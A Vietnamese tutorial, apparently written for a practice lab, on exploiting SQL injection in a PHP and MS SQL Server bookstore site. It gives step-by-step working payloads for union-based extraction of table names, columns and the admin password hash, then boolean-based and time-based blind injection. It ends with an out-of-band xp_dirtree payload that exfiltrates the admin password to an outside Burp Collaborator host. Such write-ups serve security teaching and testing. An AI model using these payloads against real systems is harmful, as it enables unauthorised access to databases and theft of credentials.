Khai thác In-Band

Ban đầu khi vào chức năng books và nhấn bất kì vào 1 sản phẩm, giao diện hiện ra như sau
![image](https://github.com/user-attachments/assets/845f36c9-eceb-423f-9de9-bf39e910a093)

+) Ta để ý thanh URL có trả về bookisbn=978-1-49192-706-9

+) Đầu tiên ta sẽ test xem có bị SQLi, SQLi xảy ra khi ta inject 1 kí tự SQL vào thì trả về lỗi
![image](https://github.com/user-attachments/assets/00d6c98d-ebae-4e2d-8c55-bcce50e92187)

Khi điền thêm kí tự `'` thì lập tức báo lỗi là Unclosed quotation mark after the character string ‘978-1-49192-706-9 tức là chưa đóng chuỗi

+) Ta điền thử kí tự `''`
![image](https://github.com/user-attachments/assets/daf186d5-c647-48db-a384-f6cc856d85a2)

Trang trả về là Empty book, nghĩa là kí tự `“` là hợp lệ

-> Câu truy vấn gốc của lập trình viên sẽ có dạng:
`select … from … where bookisbn='…'`

Nghĩa là chuỗi nhập trên URL sẽ được đặt trong cặp dấu nháy đơn của lập trình viên

+) Ta biến thứ bất thường (tức dấu nháy đơn) thành bình thường bằng cách thêm `-- -` vào cuối
![image](https://github.com/user-attachments/assets/e989fc64-16d6-4291-a11b-5dfac3e4ae56)

+) Vậy nghĩa là, ta cần chèn câu truy vấn SQL khai thác vào trước dấu comment và sau dấu nháy đơn

Vì thông tin trả về nhiều nên đây là SQLi loại In-Band

->Ta sẽ khai thác bằng phương pháp Union-Based và Error-Based

+) Muốn sử dụng Union-Based, ta cần phải để ý đến số cột, và kiểu dữ liệu
Đầu tiên là xác định số cột

Nếu ta gõ vào payload sau: `' union select 1,2,3-- -`

![image](https://github.com/user-attachments/assets/59893d5e-33ac-453f-8c20-276519d38045)

Nó thông báo về là ko khớp với số cột trước đó (tức số cột do lập trình viên viết)

Vậy thì ta cứ mò cho đến khi đúng thì thôi?

Ko nên, nếu có 100 cột, ta sẽ phải thử 100 lần, điều đó tạo ra rất nhiều lỗi, và mỗi khi ta làm gì đều sẽ được ghi vào log, và tất cả lỗi kia cũng được ghi vào log, nếu admin để ý thì sẽ “bứt dây động rừng”

Vậy thì ta phải dùng lệnh nào để xác định số cột mà ít trả về lỗi nhất

-> Sử dụng ORDER BY

Ta sẽ dùng order by và binary search để xác định số cột

Giả sử ta đoán là có 100 cột

-> Ta điền Payload: `' order by 100-- -`
![image](https://github.com/user-attachments/assets/a74a1a35-a7ea-42fe-ab0a-8d313c13ed0e)

Lỗi trả về là số cột vượt quá giới hạn cột 

Ta chia đôi ra đc 50, ta thử với 51 trước, nó báo lỗi tức <50

Ta chia đôi 50 được 25, thử với 26 trước, nó báo lỗi tức số cột <25

Ta chia đôi 25 được 12,5, thử với 13 trước, nó báo lỗi tức số cột < 12

Ta chia đôi 12 được 6, thử với 7, nó báo hợp lệ

Thử với 8 nó báo lỗi

->Vậy số cột là 7

Ta sẽ bắt đầu khai thác dữ liệu để lấy được mật khẩu của admin

-> Payload: `' union select 'a','b','c','d','e','f','g'-- -`
![image](https://github.com/user-attachments/assets/aecebd98-7779-4726-81b5-1a7b563549e4)

Nhưng khi điền thì ta thấy thông tin của ta đâu, chứng tỏ lập trình viên đã giới hạn lấy dữ liệu trả về của 1 bản ghi, mà vì dùng union bản ghi của ta bị chìm ở dưới, nên để có thể nhìn thấy dữ liệu của ta, ta phải biến câu truy vấn ở phía trước là sai

Payload: `' and 1=0 union select 'a','b','c','d','e','f','g'-- -`

![image](https://github.com/user-attachments/assets/85abdc91-b926-4688-90db-4981fc291ff1)

Tức là có ràng buộc về kiểu dữ liệu, ta sẽ cho tất cả các cột là null và 1 cột có kiểu dữ liệu nhất định để xác định được lỗi trả về, từ đó xác định được kiểu dữ liệu

Payload: `' and 1=0 union select null,null,null,null,null,null,'a'-- -`

![image](https://github.com/user-attachments/assets/df15960e-3478-457b-ba51-69ed5c376f74)

Lỗi trả về là ko khớp với kiểu dữ liệu là int vị trí thứ 7 có kiểu dữ liệu là int

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 6

Payload: `' and 1=0 union select null,null,null,null,null,'a',7-- -`
![image](https://github.com/user-attachments/assets/5bb21045-91ec-45f3-92cf-97ce6ac5da9e)

Lỗi trả về là ko thể convert thành kiểu numeric (số thập phân) vị trí thứ 6 có kiểu dữ liệu là numeric

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 5

Payload: `' and 1=0 union select null,null,null,null,'a',6,7-- -`

![image](https://github.com/user-attachments/assets/5d70cb53-5d0e-4160-8c77-53bc7be6c18f)

Dữ liệu trả về bình thường, chứng tỏ để ‘a’ ở vị trí thứ 5 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 4

Payload: `' and 1=0 union select null,null,null,'b','a',6,7-- -`

![image](https://github.com/user-attachments/assets/6276ca6c-6e7a-4116-a947-e471a6db3db5)

Dữ liệu trả về bình thường, chứng tỏ để ‘b’ ở vị trí thứ 4 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 3

Payload:  `' and 1=0 union select null,null,'c','b','a',6,7-- -`

![image](https://github.com/user-attachments/assets/36e15da6-e229-44a6-9225-1c4c3ceb4576)

Dữ liệu trả về bình thường, chứng tỏ để 'c' ở vị trí thứ 3 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 2

Payload: `' and 1=0 union select null,'d','c','b','a',6,7-- -`

![image](https://github.com/user-attachments/assets/0feb0af6-d638-4b2d-aa7b-9817eaaaa77f)

Dữ liệu trả về bình thường, chứng tỏ để 'd' ở vị trí thứ 2 ko vấn đề gì

Ta thử tiếp Payload sau để xác định kiểu dữ liệu ở vị trí thứ 1

Payload: `' and 1=0 union select 'e','d','c','b','a',6,7-- -`

![image](https://github.com/user-attachments/assets/1ac31a3e-6747-4f7f-a751-fb2773bf4b43)

Dữ liệu trả về bình thường, chứng tỏ để 'e' ở vị trí thứ 1 ko vấn đề gì

Vậy Payload của ta là: 

`' and 1=0 union select 'e','d','c','b','a',6,7-- -`

Ta cần phải điền như nào để cho khớp với kiểu dữ liệu như trên

Và ta thấy vị trí kí tự ‘a’, ’e’, ’c’ đẹp nhất để hiển thị dữ liệu

+) Sau khi xác định số cột và kiểu dữ liệu xong, bước tiếp theo là extract data

MS SQL Server có các bảng sau ta cần lưu ý: 

  `information_schema` --> bao gồm 
  
      `information_schema.tables` --> bảng lưu trữ tên các bảng trong database hiện tại
      
      `information_schema.columns` --> bảng lưu trữ tên các cột trong database hiện tại
      
      `ten_database..sysdatabases` --> bảng lưu trữ các database trong hệ thống
      
      `www_project..syscolumns` --> bảng lưu trữ tên các cột trong database www_project
      
      `www_project..sysobjects` --> bảng lưu trữ tên các đối tượng trong database www_project (tên các bảng, các constraint,...)
      
      `www_project.sys.tables` --> Bảng lưu trữ tên các bảng trong database www_project
      
Mục đích : 
+) Đầu tiên ta cần phải lấy ra tên các bảng của database hiện tại và chọn tên bảng mà bạn muốn khai thác
              
+) Tiếp theo lấy ra tên các cột của bảng đó
              
+) Sau đó select các cột mà bạn muốn khai thác của bảng đó ra
              
B1: Lấy ra tên các bảng của database hiện tại

Câu lệnh để xác định database hiện tại : `select DB_NAME()`

-->Payload: `' and 1=0 union select 'e','d','c','b',DB_NAME(),6,7-- -`

![image](https://github.com/user-attachments/assets/7257692d-06d1-494b-81a9-b9f0a5d6a6b7)

Nghĩa là hiện tại ta đang ở database tên là www_project

Câu lệnh để lấy ra tên các bảng của database hiện tại, tức www_project:

`select name from www_project.sys.tables`

Payload: `' and 1=0 union select 'e','d','c','b',(select name from www_project.sys.tables),6,7-- -`

![image](https://github.com/user-attachments/assets/bb5de742-2419-4e4e-97a0-7e1ed89fe0a2)

Thông báo lỗi trả về là câu truy vấn con của ta trả về nhiều hơn một bản ghi

Vậy ta sẽ sử dụng Payload sau chỉ để lấy ra 1 bản ghi:

Payload: `' and 1=0 union select 'e','d','c','b',(select top 1 name from www_project.sys.tables),6,7-- -`

![image](https://github.com/user-attachments/assets/4733a7a4-448c-4bc2-8433-58acf8c430c0)

Ta thấy được bản ghi đầu tiên, tức tên bảng là admin

Ta muốn nhìn được hết tên của các bảng thì ta phải brute force

+)Trước tiên cần phải tìm xem có bao nhiêu bảng ở trong database hiện tại (thì mới có thể brute force được)

Sử dụng lệnh COUNT, ta có câu lệnh sau: `select count(name) from www_project.sys.tables`

-->Vậy payload là:

`' and 1=0 union select 'e','d','c','b',(select count(name) from www_project.sys.tables),6,7-- -`

![image](https://github.com/user-attachments/assets/db721186-a483-4216-b0f0-424836288548)

Ta thấy kết quả trả về là 6, tức có 6 bảng ở trong database www_project

+) Giờ ta cần thực hiện việc sử dụng 1 câu lệnh khác để lấy ra từng bản ghi (tức tên từng bảng) của database hiện tại

Lúc này ta phải sử dụng câu lệnh SQL khác, đó chính là OFFSET…FETCH

Cú pháp: `SELECT ten_cot  FROM ten_bang ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY`

Trong đó:
ORDER BY ten_cot (stt của cột đó-1,2,…): Bắt buộc phải có thứ tự để OFFSET hoạt động chính xác.

OFFSET 1 ROW: Bỏ qua bản ghi đầu tiên. (0 – N) 

FETCH NEXT 1 ROW ONLY: Lấy đúng 1 bản ghi tiếp theo.

Câu lệnh là: `SELECT name  FROM www_project.sys.tables ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY`

Vậy Payload là: 

`' and 1=0 union select 'e','d','c','b',(SELECT name  FROM www_project.sys.tables ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),6,7-- -`

![image](https://github.com/user-attachments/assets/478f23d2-485d-476c-a18e-896b9e8f96fc)

Lệnh đã chạy thành công, ta tiến hành bắt gói tin và Sử dụng Intruder để tăng OFFSET 0 từ 0 đến 5 (dó có 6 bảng, bỏ qua bảng đầu tiên thì OFFSET 1)

![image](https://github.com/user-attachments/assets/0dedab26-52c7-4f9e-945a-8f0d171c2667)

![image](https://github.com/user-attachments/assets/99a4ed83-292f-4348-b43c-2494a20dce75)

![image](https://github.com/user-attachments/assets/462ba8c7-6d40-4490-95fb-2c64f73175fd)

![image](https://github.com/user-attachments/assets/10b36ea2-91ca-44ef-b750-1aee0bccb44a)

Ta đã lấy được danh sách tên các bảng trong database hiện tại, ta tiến hành khai thác bảng admin

Bước 2: Lấy ra tên các cột của bảng admin 

Câu lệnh SQL:
`select column_name from information_schema.columns where table_name='admin'`
Payload:
`' and 1=0 union select 'e','d','c','b',(select top 1 column_name from information_schema.columns where table_name='admin'),6,7-- -`

![image](https://github.com/user-attachments/assets/e9f019c7-fda5-4dd4-a83c-8c547a428a5f)

Ta thấy tên 1 cột là name

Ta xem bảng admin có bao nhiêu cột, nếu số lượng nhiều ta tiến hành chạy Intruder như trên, nếu ko thì ta chỉ cần chạy bằng tay câu lệnh OFFSET..FETCH

Payload:
`' and 1=0 union select 'e','d','c','b',(select count(column_name) from information_schema.columns where table_name='admin'),6,7-- -`

![image](https://github.com/user-attachments/assets/0c51c950-2894-4d12-9703-45c9dffdaba3)

Số cột là 2, vậy ta có tên cột thứ nhất là name, ta gõ lệnh sau để lấy tên cột thứ 2

`select column_name from information_schema.columns where table_name='admin' ORDER BY 1 OFFSET 1 ROW FETCH NEXT 1 ROW ONLY`

Payload:
`' and 1=0 union select 'e','d','c','b',(select column_name from information_schema.columns where table_name='admin' ORDER BY 1 OFFSET 1 ROW FETCH NEXT 1 ROW ONLY),6,7-- -`

![image](https://github.com/user-attachments/assets/8804d8f5-6740-4078-b54b-5f2c8de0e13f)

Vậy tên cột thứ 2 là pass

Giờ ta cần tiến hành lấy tên user và password tương ứng

Lấy cái nào ta cũng order theo 1 thứ tự nhất định (theo cột name chả hạn) để trả về các bản ghi theo đúng thứ tự, tránh để user này thì password kia

(Tiến hành đếm số lượng bản ghi trong bảng admin để xem có nên brute force hay ko, nếu ít bản ghi thì chạy tay bình thường, sau khi chạy được số bản ghi là 1 nên ko cần phải brute force)

Câu lệnh: `select name from admin`

Payload: `' and 1=0 union select 'e','d','c','b',(select name from admin),6,7-- -`

![image](https://github.com/user-attachments/assets/8f6966b1-dff0-421c-9871-bcca3082487f)

Lỗi này xảy ra do xung đột "collation" giữa hai cột (hoặc hai bảng) khi thực hiện UNION, JOIN, WHERE, hoặc ORDER BY. SQL Server không thể tự động chuyển đổi giữa hai kiểu collation (Latin1_General_CI_AS và SQL_Latin1_General_CP1_CI_AS).

Ta thực hiện ép kiểu COLLATE về cùng một loại, ta thấy Latin1_General_CI_AS đứng trước trong thông báo lỗi, nên khả năng là câu lệnh của lập trình viên sử dụng kiểu collation là Latin1_General_CI_AS-->Ta ép câu lệnh của ta về kiểu đó cho phù hợp

Payload: `' and 1=0 union select 'e','d','c','b',(select name COLLATE Latin1_General_CI_AS from admin),6,7-- -`

![image](https://github.com/user-attachments/assets/9966c371-862d-4e72-b5a4-b03f83e4b730)

Trả về user là admin

Làm tương tự để lấy được pass

Payload: `' and 1=0 union select 'e','d','c','b',(select pass COLLATE Latin1_General_CI_AS from admin),6,7-- -`

![image](https://github.com/user-attachments/assets/21b2226b-2b83-4ba7-b862-2092344a757c)

Pass của admin là `d033e22ae348aeb5660fc2140aec35850c4da997`

Ta tra chuỗi pass trên ở Google, đó là một chuỗi được băm bằng sha1, nội dung trước khi băm là `admin`
-----

Bind-SQLi

Tấn công bằng phương pháp Boolean-Based

![image](https://github.com/user-attachments/assets/a097ec48-8f6f-4073-974f-b6314db67f74)

Ta có trang search chỉ trả về số lượng sách <= giá mà người dùng nhập vào, ví dụ nhập vào 20 thì số lượng sách trả về có giá <=20

Ta thử điền kí tự SQL đặc biệt dấu nháy đơn

Payload: `20'`

![image](https://github.com/user-attachments/assets/8f680f6c-be3b-4203-891d-bf8e2f3b9198)

Kết quả trả về lỗi

Ta thử điền kí tự SQL đặc biệt là dấu nháy kép

Payload: `20"`

![image](https://github.com/user-attachments/assets/627f6270-4659-4f41-b7aa-4c79e8548574)

Kết quả trả về cũng là fail, vậy liệu có phải chỉ cho phép điền dữ liệu dạng số (int, …)?

Muốn biết ta thử thêm dấu comment `-- -` để xem thử

Payload: `20-- -`

![image](https://github.com/user-attachments/assets/1433bb0a-5320-4fb1-9032-a15faa605b6c)

Trả về vẫn là fail --> chứng tỏ đây ko phải là kiểu số vì nếu kiểu số nó sẽ ko quan tâm thứ đằng sau nó là gì

Vậy chắc đằng sau nó có kí tự gì đó (hoặc kí tự ' của ta bị lập trình viên chặn), ta thử thêm dấu nháy đơn rồi thêm comment để xem kết quả liệu có biến bất thường thành bình thường ko

Payload: `20'-- -`

![image](https://github.com/user-attachments/assets/4422c264-95d0-4e79-9de3-feaec5e253a7)

Có kết quả trả về câu lệnh của lập trình viên có dạng như sau:

`select count(…) from … where price <= '20'`

Vì kết quả trả về ko cụ thể, ko nhiều thông tin (chỉ trả về số lượng), nên ta sẽ khai thác bằng các phương pháp như boolean-based, time-based, oob, staked query

1/Boolean-Based

Vì kết quả trả về một là lỗi, hai là số lượng, ta có thể lợi dụng điều đó để đoán dữ liệu ta muốn khai thác

Muốn đoán kí tự ta phải dùng lệnh SUBSTRING để cắt chuỗi

Cú pháp: `SUBSTRING(string, start, length)`

Ta muốn lấy ra tên database hiện tại

Câu lệnh: select DB_NAME() 

Sau khi thêm SUBSTRING để lấy từng kí tự của tên database hiện tại:

`select SUBSTRING(DB_NAME(),1,1) --> Lấy 1 kí tự bắt đầu từ kí tự thứ nhất`

Vì đây ta đang dựa vào boolean để đoán nên câu lệnh trên phải có tính đúng sai

Câu lệnh: `select SUBSTRING(DB_NAME(),1,1)='a'`

--> Payload: 20' and SUBSTRING(DB_NAME(),1,1)='a'-- -

![image](https://github.com/user-attachments/assets/f09088bd-1f40-449a-8132-4192c65784d0)

Kết quả trả về như trên, nghĩa là kí tự đầu tiên của tên database hiện tại ko phải là kí tự 'a'

Nếu cho chạy brute force thì sẽ tạo ra nhất nhiều lỗi, ta sẽ sử dụng LIKE để đoán

Cú pháp: `LIKE '[a-z]'`

Câu lệnh: `select SUBSTRING(DB_NAME(),1,1)LIKE '[a-z]'`

--> Payload: `20' and SUBSTRING(DB_NAME(),1,1) LIKE '[a-z]'-- -`

![image](https://github.com/user-attachments/assets/b1479ad3-8966-4935-aefb-f36f79229736)

Kết quả trả về đúng, ta chia đôi đoạn a-z ra và tìm kiếm nhị phân (binary search) như ở In-band đã đề cập đến

![image](https://github.com/user-attachments/assets/afeaeeec-69ca-4684-9a9c-7402f5580b3a)

Chia đôi ra được kí tự M, ta thử kiểm tra xem từ M đến Z có khớp ko

--> Payload:` 20' and SUBSTRING(DB_NAME(),1,1) LIKE '[a-z]'-- -`

...

Hoặc cách khác để ta chỉ cần liệt kê tên các bảng trong database hiện tại (làm cách nào để đỡ phải đoán nhiều nhất)

Câu lệnh: `select table_name from information_schema.tables where table_catalog=DB_NAME()`

Vì câu lệnh trên sẽ trả về rất nhiều bản ghi nên ta sẽ dùng `ORDER BY 1 OFFSET 1 ROW FETCH NEXT 1 ROW ONLY` để lấy ra tên của từng bảng

Câu lệnh: `select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY`

Sau khi thêm SUBSTRING để lấy từng kí tự:

Câu lệnh: `SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1)`

--> Payload: 

`20' and SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[a-z]'-- -`

![image](https://github.com/user-attachments/assets/6a06a33f-8861-41ca-bb02-098a99191066)

Kết quả trả về đúng, tức là kí tự đầu tiên của tên bảng đầu tiên là nằm trong khoảng a-z

Ta xét tiếp từ m-z

--> Payload: 

`20' and SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[m-z]'-- -`

![image](https://github.com/user-attachments/assets/5405a343-1006-404d-8e26-db48a4e73560)

Thông báo hiển thị như trên tức kí tự đầu tiên ko nằm trong khoảng từ m-z

Nghĩa là kí tự đó nằm trong khoảng từ a-m

Ta chia đôi tiếp được chữ f, ta xét trong khoảng f-m

--> Payload: 

`20' and SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[f-m]'-- -`

![image](https://github.com/user-attachments/assets/98a6445f-e939-4b54-ba59-5c499cb186bf)

Vẫn sai --> Xét từ a-f, chia đôi ta được c --> Xét từ c-f

-->Payload: 

`20' and SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[c-f]'-- -`

![image](https://github.com/user-attachments/assets/aafd8ebe-0b87-4967-9b00-5e97b9a8bcd8)

Vẫn sai --> Xét từ a-c --> xét từ b-c

-->Payload: 

`20' and SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[b-c]'-- -`

![image](https://github.com/user-attachments/assets/76e2a80b-f707-46f6-8f63-5938c647563a)

--> Kí tự đúng là 'a'

![image](https://github.com/user-attachments/assets/7101328f-e1c0-4f58-88f6-337953617936)

Cứ làm lần lượt như vậy cho đến khi tra được tất cả các bảng và chọn bảng mà mình muốn (admin)

B2: Cần tìm tên các cột trong bảng admin, ta cũng phải đoán lần lượt như vậy

Câu lệnh: `select column_name from information_schema.columns where table_name='admin'`

Áp dụng SUBSTRING và điều kiện đúng sai

Câu lệnh: `SUBSTRING((select column_name from information_schema.columns where table_name='admin' ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1)LIKE ' [a-z] '`

-->Payload: 

`20' and SUBSTRING((select column_name from information_schema.columns where table_name='admin' ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[a-z]'-- -`

![image](https://github.com/user-attachments/assets/9fd501f8-98e0-4f91-9ae3-fa3da3126b6d)

Làm tương tự như trên để đoán được tên các cột có trong bảng, lâu tí th nhưng ko sao, nếu viết script áp dụng binary search thì chắc sẽ nhanh hơn

B3: Sau đó tìm được cột name và pass, ta cần lấy tất cả dữ liệu từ cột name cũng như cột pass nhưng phải sắp xếp chúng theo thứ tự nhất định vì ta lấy dữ liệu từ cột name sau đó mới lấy dữ liệu từ cột pass

Câu lệnh: `SUBSTRING((select name from admin ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1)LIKE '[a-z]'`

--> Payload: `20' and SUBSTRING((select name from admin ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1)LIKE '[a-z]'-- -`

![image](https://github.com/user-attachments/assets/3da51b0e-d91e-4f50-a2e9-566cceb82146)

Cứ làm tuần tự lần lượt như vậy cho đến khi lấy được cột name của các bản ghi

Làm tương tự cho cột pass

Câu lệnh: `SUBSTRING((select pass from admin ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1)LIKE '[a-z]'`

--> Payload: `20' and SUBSTRING((select pass from admin ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[a-z]'-- -`

![image](https://github.com/user-attachments/assets/04552771-fe0b-487d-b9cc-254f073ead74)

Ngoài việc đoán kí tự dựa trên các chữ cái, ta có thể chuyển các chữ cái thành mã ASCII rồi xem nó phù hợp trong khoảng nào

--> Payload: `20' and ASCII(SUBSTRING((select pass from admin ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1)) BETWEEN 96 AND 97-- -`

![image](https://github.com/user-attachments/assets/de5c7773-3e09-43be-b46c-062f29fbfffd)

Các bạn có thể tìm hiểu thêm (phần này viết script sẽ hay hơn)

----
Time-Based

Trong trường hợp bạn nhập bất kì một cái gì vào cũng thấy hiển thị kết quả trả về, bạn ko thể biết được câu lệnh của bạn đúng hay sai

![image](https://github.com/user-attachments/assets/146d1bb2-8441-4760-92a5-7e4903178593)

Vì đây là PHP+MS SQL Server --> Có thể dùng được Stack Query

Payload để kiểm tra: `1'; BEGIN WAITFOR DELAY '0:0:3' END-- -`

![image](https://github.com/user-attachments/assets/ae123ff8-bf97-4e91-a336-39272d877ddc)

--> Sau 3 s nó mới load xong --> Tín hiệu rằng đây là chỗ bị SQLi

Ta sẽ dùng nó để đoán các kí tự

Payload: `1'; IF (SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),1,1) LIKE '[a-z]') BEGIN WAITFOR DELAY '0:0:10' END-- -`

![image](https://github.com/user-attachments/assets/4e5961dd-93e6-4eb4-a625-f4dd02e5212b)

Nó đang loadCâu lệnh của ta là đúng 

Các bạn cứ đoán lần lượt từ tên bảng, tên cột, rồi dữ liệu trong các cột nhé, hơi lâu thật nếu nghĩ được cách viết script khai thác thì ok

---
Out-of-band (OOB)

Interaction: Payload: 1'; exec master..xp_dirtree '//.burp_collab/a'-- -

Exfiltration:

-->Payload: `1';DECLARE @p VARCHAR(1024);SET @p = (SELECT pass FROM admin WHERE name = 'admin');DECLARE @dir NVARCHAR(1024)=CONCAT('//',@p,'.burp_collab/a');EXEC master..xp_dirtree @dir-- -`

VD:

`1';DECLARE @p VARCHAR(1024);SET @p = (SELECT pass FROM admin WHERE name = 'admin');DECLARE @dir NVARCHAR(1024)=CONCAT('//',@p,'.k6rm6w7x0t5y531bs1ztte7mbdh45vtk.oastify.com/a');EXEC master..xp_dirtree @dir-- -`

![image](https://github.com/user-attachments/assets/63712df9-ab13-4bfe-90b0-174c728a7ee4)

Giải thích :
Lệnh exec master..xp_dirtree để truy cập Folder và liệt kê File

Thay vì các bác dùng burp_collab, các bác có thể tự build server để gửi thông tin ra server của mình












